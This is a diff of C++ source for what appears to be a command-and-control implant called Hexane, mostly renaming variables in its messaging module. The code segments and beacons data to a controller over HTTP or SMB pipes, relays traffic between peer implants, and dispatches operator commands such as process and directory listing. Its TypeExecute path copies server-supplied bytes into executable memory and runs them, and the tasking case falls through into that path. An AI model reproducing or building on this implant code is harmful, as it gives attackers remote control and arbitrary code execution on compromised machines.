@@ -94,49 +94,53 @@ namespace Message {
         defer:
     }
 
-    VOID QueueSegments(PBYTE Buffer, ULONG Length) {
+    VOID QueueSegments(byte *buffer, uint32_t length) {
         HEXANE
 
-        PSTREAM Queue   = { };
-        ULONG Offset    = 0;
-        ULONG PeerId    = 0;
-        ULONG TaskId    = 0;
-        ULONG cbSeg     = 0;
-        ULONG Index     = 1;
-        ULONG nSegs     = (Length + MESSAGE_MAX - 1) / MESSAGE_MAX;
+        PSTREAM entry = { };
 
-        while (Length > 0) {
-            cbSeg   = Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
-            Queue    = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE));
+        uint32_t offset     = 0;
+        uint32_t peer_id    = 0;
+        uint32_t task_id    = 0;
+        uint32_t cb_seg     = 0;
+        uint32_t index      = 1;
+        uint32_t n_seg      = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
 
-            x_memcpy(&PeerId, Buffer, 4);
-            x_memcpy(&TaskId, Buffer + 4, 4);
+        while (length > 0) {
+            cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
+                ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
+                : length;
 
-            Queue->PeerId    = PeerId;
-            Queue->TaskId    = TaskId;
-            Queue->MsgType   = TypeSegment;
+            entry = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));
 
-            Stream::PackDword(Queue, Index);
-            Stream::PackDword(Queue, nSegs);
-            Stream::PackDword(Queue, cbSeg);
-            Stream::PackBytes(Queue, S_CAST(PBYTE, Buffer) + Offset, cbSeg);
+            x_memcpy(&peer_id, buffer, 4);
+            x_memcpy(&task_id, buffer + 4, 4);
 
-            Index++;
-            Length -= cbSeg;
-            Offset += cbSeg;
+            entry->PeerId    = peer_id;
+            entry->TaskId    = task_id;
+            entry->MsgType   = TypeSegment;
 
-            AddMessage(Queue);
+            Stream::PackDword(entry, index);
+            Stream::PackDword(entry, n_seg);
+            Stream::PackDword(entry, cb_seg);
+            Stream::PackBytes(entry, B_PTR(buffer) + offset, cb_seg);
+
+            index++;
+            length -= cb_seg;
+            offset += cb_seg;
+
+            AddMessage(entry);
         }
     }
 
     VOID MessageTransmit() {
         HEXANE
 
-        PSTREAM Outbound    = Stream::CreateStream();
-        PSTREAM Inbound     = { };
-        PSTREAM Head        = { };
-        PSTREAM Swap        = { };
-        PARSER Parser       = { };
+        PSTREAM out     = Stream::CreateStream();
+        PSTREAM in      = { };
+        PSTREAM head    = { };
+        PSTREAM swap    = { };
+        PARSER parser   = { };
 
         retry:
 
@@ -144,86 +148,86 @@ namespace Message {
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #elifdef TRANSPORT_HTTP
-            PSTREAM Task = Stream::CreateStreamWithHeaders(TypeTasking);
+            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);
 
-            OutboundQueue(Task);
+            OutboundQueue(entry);
             goto retry;
 #endif
         } else {
-            Head = Ctx->Transport.OutboundQueue;
-            while (Head) {
-                if (!Head->Ready) {
+            head = Ctx->Transport.OutboundQueue;
+            while (head) {
+                if (!head->Ready) {
 
-                    if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
+                    if (head->Length + MESSAGE_HEADER_SIZE + out->Length > MESSAGE_MAX) {
                         break;
                     }
-                    if (Head->Buffer) {
-                        Parser::CreateParser(&Parser, S_CAST(PBYTE, Head->Buffer), Head->Length);
-                        Stream::PackDword(Outbound, Head->PeerId);
-                        Stream::PackDword(Outbound, Head->TaskId);
-                        Stream::PackDword(Outbound, Head->MsgType);
+                    if (head->Buffer) {
+                        Parser::CreateParser(&parser, B_PTR(head->Buffer), head->Length);
+
+                        Stream::PackDword(out, head->PeerId);
+                        Stream::PackDword(out, head->TaskId);
+                        Stream::PackDword(out, head->MsgType);
 
                         if (Ctx->Root) {
-                            Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
-                        } else {
-                            Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
+                            Stream::PackBytes(out, B_PTR(head->Buffer), head->Length);
 
-                            x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
-                            Outbound->Length += Head->Length;
+                        } else {
+                            out->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, out->Buffer, out->Length + head->Length);
+                            x_memcpy(B_PTR(out->Buffer) + out->Length, head->Buffer, head->Length);
+
+                            out->Length += head->Length;
                         }
                     } else {
                         return_defer(ERROR_NO_DATA);
                     }
-
-                    Head->Ready = TRUE;
+                    head->Ready = TRUE;
                 }
-
-                Head = Head->Next;
+                head = head->Next;
             }
         }
 
 #ifdef TRANSPORT_HTTP
-        Http::HttpCallback(Outbound, &Inbound);
+        Http::HttpCallback(out, &in);
 #endif
 #ifdef TRANSPORT_PIPE
-        Smb::PeerConnectEgress(Outbound, &Inbound);
+        Smb::PeerConnectEgress(out, &in);
 #endif
-        Stream::DestroyStream(Outbound);
-        Outbound = NULL;
+        Stream::DestroyStream(out);
+        out = nullptr;
 
-        if (Inbound) {
+        if (in) {
             ClearQueue();
 
-            if (PeekPID(Inbound)) {
-                CommandDispatch(Inbound);
-                Stream::DestroyStream(Inbound);
+            if (PeekPID(in)) {
+                CommandDispatch(in);
+                Stream::DestroyStream(in);
+
             } else {
-                Swap        = Inbound;
-                Inbound     = Outbound;
-                Outbound    = Swap;
+                swap = in;
+                in = out;
+                out = swap;
 
                 if (Ctx->Config.IngressPipename) {
-                    Smb::PeerConnectIngress(Outbound, &Inbound);
+                    Smb::PeerConnectIngress(out, &in);
 
-                    if (Inbound) {
-                        OutboundQueue(Inbound);
+                    if (in) {
+                        OutboundQueue(in);
                     }
                 }
-
-                Stream::DestroyStream(Outbound);
+                Stream::DestroyStream(out);
             }
         } else {
-            Head = Ctx->Transport.OutboundQueue;
-            while (Head) {
-                Head->Ready = FALSE;
-                Head = Head->Next;
+            head = Ctx->Transport.OutboundQueue;
+            while (head) {
+                head->Ready = FALSE;
+                head = head->Next;
             }
         }
 
     defer:
     }
 
-    RDATA_SECTION COMMAND_MAP CmdMap[] = {
+    RDATA_SECTION COMMAND_MAP cmd_map[] = {
         {.Id = CommandDir,          .Function = Commands::DirectoryList},
         {.Id = CommandMods,         .Function = Commands::ProcessModules},
         {.Id = CommandProcess,      .Function = Commands::ProcessList},
@@ -232,66 +236,63 @@ namespace Message {
         {.Id = 0,                   .Function = nullptr}
     };
 
-    VOID CommandDispatch (PSTREAM Inbound) {
+    VOID CommandDispatch (PSTREAM in) {
         HEXANE
 
-        PARSER Parser   = { };
-        ULONG MsgType   = 0;
+        PARSER parser   = { };
+        ULONG msg_type  = 0;
 
-        Parser::CreateParser(&Parser, S_CAST(PBYTE, Inbound->Buffer), Inbound->Length);
-        Parser::UnpackDword(&Parser); // throw-away peer id
+        Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
+        Parser::UnpackDword(&parser); // throw-away peer id
 
-        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
-        MsgType                     = Parser::UnpackDword(&Parser);
+        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
+        msg_type = Parser::UnpackDword(&parser);
 
-        switch (MsgType) {
+        switch (msg_type) {
 
             case TypeCheckin: {
-
                 Ctx->Session.Checkin = TRUE;
                 break;
             }
 
             case TypeTasking: {
-
-                auto CmdId = Parser::UnpackDword(&Parser);
-                if (CmdId == CommandNoJob) {
+                auto cmd_id = Parser::UnpackDword(&parser);
+                if (cmd_id == CommandNoJob) {
                     break;
                 }
 
-                for (uint32_t FnCounter = 0;; FnCounter++) {
-                    if (!CmdMap[FnCounter].Function) {
+                for (uint32_t i = 0 ;; i++) {
+                    if (!cmd_map[i].Function) {
                         return_defer(ERROR_PROC_NOT_FOUND);
                     }
 
-                    if (CmdMap[FnCounter].Id == CmdId) {
-                        const auto Cmd = R_CAST(CmdSignature, Ctx->Base.Address + R_CAST(UINT_PTR, CmdMap[FnCounter].Function));
-                        Cmd(&Parser);
+                    if (cmd_map[i].Id == cmd_id) {
+                        const auto cmd = R_CAST(CmdSignature, Ctx->Base.Address + U_PTR(cmd_map[i].Function));
+                        cmd(&parser);
                         break;
                     }
                 }
             }
 
             case TypeExecute: {
+                void *exec  = { };
+                size_t size = parser.Length;
 
-                LPVOID Exec = { };
-                SIZE_T Size = Parser.Length;
-
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &Exec, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                     return_defer(ntstatus);
                 }
 
-                x_memcpy(Exec, Parser.Buffer, Parser.Length);
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &Exec, &Size, PAGE_EXECUTE_READ, nullptr))) {
+                x_memcpy(exec, parser.Buffer, parser.Length);
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
                     return_defer(ntstatus);
                 }
 
-                auto (*Cmd)(PPARSER) = R_CAST(VOID (*)(PPARSER), Exec);
-                Cmd(&Parser);
+                auto (*cmd)(PPARSER) = R_CAST(VOID (*)(PPARSER), exec);
+                cmd(&parser);
 
-                x_memset(Exec, 0, Size);
+                x_memset(exec, 0, size);
 
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &Exec, &Size, MEM_FREE))) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
                     return_defer(ntstatus);
                 }
             }
@@ -301,6 +302,6 @@ namespace Message {
         }
 
         defer:
-        Parser::DestroyParser(&Parser);
+        Parser::DestroyParser(&parser);
     }
 }
